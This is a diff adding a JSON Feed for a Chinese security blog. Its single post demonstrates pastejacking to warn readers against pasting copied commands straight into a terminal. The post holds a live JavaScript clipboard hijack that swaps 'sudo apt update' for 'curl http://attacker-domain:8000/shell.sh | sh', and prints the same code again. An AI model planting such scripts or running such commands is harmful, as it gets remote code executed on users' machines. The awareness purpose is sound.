@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "筆記ZONE • All posts by \"資安\" tag",
+    "description": "",
+    "home_page_url": "https://zonego.tw",
+    "items": [
+        {
+            "id": "https://zonego.tw/2022/04/27/copy-past/",
+            "url": "https://zonego.tw/2022/04/27/copy-past/",
+            "title": "注意複製貼上內容",
+            "date_published": "2022-04-27T11:44:03.000Z",
+            "content_html": "<span id=\"more\"></span>\n<h2 id=\"注意複製貼上內容\"><a href=\"#注意複製貼上內容\" class=\"headerlink\" title=\"注意複製貼上內容\"></a>注意複製貼上內容</h2><p>我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容!</p>\n<p>複製這個指令試試看</p>\n<p id=\"copy\">sudo apt update</p>\n\n<script>\ndocument.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\\n'); e.preventDefault(); });\n</script>\n\n<p>把剛剛複製的貼這邊</p>\n<textarea style=\"height: 100px; min-height: 100px; width:100%; resize: none;\" cols=\"30\" name=\"textarea\" rows=\"5\" placeholder=\"Paste your safe text here...\"></textarea>\n\n\n<p>中間的奧秘就是用 JavaScript 達到改寫複製的內容</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">&#x27;copy&#x27;</span>).<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;copy&#x27;</span>, <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">e</span>) &#123; <br>    e.<span class=\"hljs-property\">clipboardData</span>.<span class=\"hljs-title function_\">setData</span>(<span class=\"hljs-string\">&#x27;text/plain&#x27;</span>, <span class=\"hljs-string\">&#x27;curl http://attacker-domain:8000/shell.sh | sh\\n&#x27;</span>); <br>    e.<span class=\"hljs-title function_\">preventDefault</span>(); <br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<p>所以，在貼上之前記得先貼到記事本檢查，<strong>不要直接貼到終端機使用</strong></p>\n<h3 id=\"來源\"><a href=\"#來源\" class=\"headerlink\" title=\"來源\"></a>來源</h3><p><a href=\"https://www.wizer-training.com/blog/copy-paste\">https://www.wizer-training.com/blog/copy-paste</a></p>\n",
+            "tags": [
+                "資安",
+                "網路資源"
+            ]
+        }
+    ]
+}
